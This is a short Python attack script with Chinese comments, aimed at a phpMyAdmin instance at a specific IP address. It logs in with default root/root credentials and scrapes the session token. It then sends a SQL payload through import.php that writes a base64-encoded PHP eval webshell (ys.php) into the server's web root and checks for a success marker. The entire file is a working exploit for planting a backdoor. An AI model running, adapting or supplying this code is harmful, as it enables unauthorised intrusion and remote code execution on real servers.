#!/usr/bin/env python3
"""利用 phpMyAdmin import.php 的 PHP 执行通道直接写 webshell
payload 里 <?php file_put_contents(...base64...) ?> 会在 81.70 上执行
"""
import urllib.request, http.cookiejar, re, urllib.parse, time

B = "http://81.70.245.25/phpmyadmin/"
cj = http.cookiejar.CookieJar()
op = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj))
op.addheaders = [("User-Agent", "Mozilla/5.0")]
html = op.open(B, timeout=10).read().decode("utf-8", "ignore")
tok = re.search(r'name="token" value="([a-f0-9]{32})"', html).group(1)
data = f"pma_username=root&pma_password=root&server=1&token={tok}".encode()
op.open(urllib.request.Request(B + "index.php", data=data), timeout=10).read()

def sql(q):
    qq = urllib.parse.urlencode({"token": tok, "sql_query": q, "ajax_request": "true", "db": "mysql"})
    r = op.open(urllib.request.Request(B + "import.php?" + qq, data=b""), timeout=15)
    return r.read().decode("utf-8", "ignore")

# ys.php = <?php @eval($_POST[x]);?>
# base64: PD9waHAgQGV2YWwoJF9QT1NUW3hdKTs/Pg==
payload = "SELECT '<?php file_put_contents(\"C:/phpStudy/WWW/ys.php\", base64_decode(\"PD9waHAgQGV2YWwoJF9QT1NUW3hdKTs/Pg==\")); echo \"WRITE_OK_7788\";?>'"
print("发送 payload...")
r = sql(payload)
print("响应:", "WRITE_OK_7788" in r, "|", r[:150].replace("\n", " "))
time.sleep(1)
